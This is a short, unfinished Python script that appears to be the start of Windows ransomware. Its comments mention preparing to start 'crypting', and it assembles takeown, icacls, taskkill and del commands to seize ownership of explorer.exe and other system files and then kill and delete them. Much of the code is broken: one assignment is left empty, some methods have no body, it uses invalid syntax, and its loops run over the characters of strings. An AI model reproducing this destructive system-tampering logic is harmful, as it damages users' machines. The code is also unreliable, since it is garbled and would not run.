#!/usr/bin/python
#coding:utf-8

import os, sys

class ownThenUse():
    #First things first, get all the rights needed to start crypting *
    letter = os.environ['SystemDrive']
    user = os.environ["Username"]

    def __init__(self):
        self.explorer         = "{}\\Windows\\explorer.exe".format(letter)
        self.takeownTarget    = "START /WIN {}\\Windows\\System32\\takeown.exe /F".format(letter)
        self.useIcalcs        = "START /WIN {}\\Windows\\System32\\icalcs.exe /F".format(letter)
        self.userDir          = "{}\\Users\\{}\\AppData\\Roaming\\installer\\TrackMania".format(letter, user)
        self.delete           = "del"
        self.kill             = "START taskkill"
        self.windowsDir       = "{}\\Windows\\".format(letter)


    #Faire des boucles pour chaque action afin que ce soit récursif

    def processus(self):
        #Find the process I want to own
        for x in self.explorer:
            self.explorer = x
            self.ownIt =
            os.system(self.ownIt)

    def takeTheOwn(self):
        #Own it
        for x in self.userDir:
            self.ownDir = x.format(self.takeownTarget, letter, user)
            os.system(self.ownDir)


    def getTheRights(self):
        #Get all the rights
        self.useIcalcs = "{}\\Windows\\System32\\icalcs.exe".format(letter)
        self.get_permissions = "{}{}".format(self.useIcalcs,self.explorer)

    def killTheProcess(self):
        #Kill the chosen process

    def deleteTheProcess(self):
        #Delete the chosen process
        try:
            supp = "{}\\Windows\\System\\explorer.exe".format(self.del)
            os.system(supp)
        except:
            pass
            
